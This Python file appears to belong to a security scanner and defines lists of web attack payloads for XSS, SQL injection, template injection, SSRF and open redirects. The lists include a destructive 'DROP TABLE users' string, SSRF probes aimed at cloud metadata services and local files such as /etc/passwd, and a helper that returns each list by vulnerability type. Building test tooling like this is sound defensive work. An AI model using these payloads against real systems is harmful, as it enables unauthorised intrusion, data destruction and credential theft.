"""Payload generation service for auto-detecting security testing opportunities."""


class PayloadGenerator:
    """Generate payload sets for different vulnerability types."""

    # XSS payloads - reflected and stored variants
    XSS_PAYLOADS = [
        # Reflected XSS
        '"><script>alert(1)</script>',
        '"><svg/onload=alert(1)>',
        "')<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        "javascript:alert(1)",
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        # Event handler variations
        '<iframe src=javascript:alert(1)>',
        '<img src=/ onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        # Protocol-based
        '<a href="javascript:alert(1)">click</a>',
        # DOM-based patterns
        '${alert(1)}',
        '{{alert(1)}}',
        '<% alert(1) %>',
    ]

    # SQLi payloads - basic detection only
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT NULL, NULL, NULL --",
        "1' AND '1'='1",
        "1' OR '1'='1' --",
        "admin' --",
        "' OR 1=1 --",
        "1' AND SLEEP(5) --",
        "1' UNION SELECT version() --",
        "1' UNION ALL SELECT NULL --",
    ]

    # SSTI payloads
    SSTI_PAYLOADS = [
        # Jinja2/Django
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "${config}",
        "{{request}}",
        # Expression Language
        "#{request}",
        # Velocity
        "#set($x=123)$x",
        # Freemarker
        "<#assign x=123>${x}",
        # Thymeleaf
        "[(${7*7})]",
        "[($7*7$)]",
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1:8000",
        "http://localhost:8000",
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://instance-data.c.internal/",
        "gopher://127.0.0.1:25/HELO",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "dict://127.0.0.1:11211/",
        "sftp://127.0.0.1/",
    ]

    # Open Redirect payloads
    OPENREDIRECT_PAYLOADS = [
        "//example.com",
        "///example.com",
        "////example.com",
        "http://example.com",
        "https://example.com",
        "//google.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "\nhttp://example.com",
        "\rhttp://example.com",
        "//google.com%40example.com",
        "//example.com@google.com",
    ]

    @classmethod
    def get_payloads_for_type(cls, vuln_type: str) -> list[str]:
        """Get payload list for a specific vulnerability type."""
        vuln_type = vuln_type.lower()
        if vuln_type in ("xss", "reflected_xss", "stored_xss"):
            return cls.XSS_PAYLOADS
        elif vuln_type in ("sqli", "sql_injection"):
            return cls.SQLI_PAYLOADS
        elif vuln_type in ("ssti", "template_injection"):
            return cls.SSTI_PAYLOADS
        elif vuln_type in ("ssrf", "server_side_request_forgery"):
            return cls.SSRF_PAYLOADS
        elif vuln_type in ("openredirect", "open_redirect"):
            return cls.OPENREDIRECT_PAYLOADS
        return []

    @classmethod
    def get_all_payload_types(cls) -> list[str]:
        """List all available payload vulnerability types."""
        return ["xss", "sqli", "ssti", "ssrf", "openredirect"]
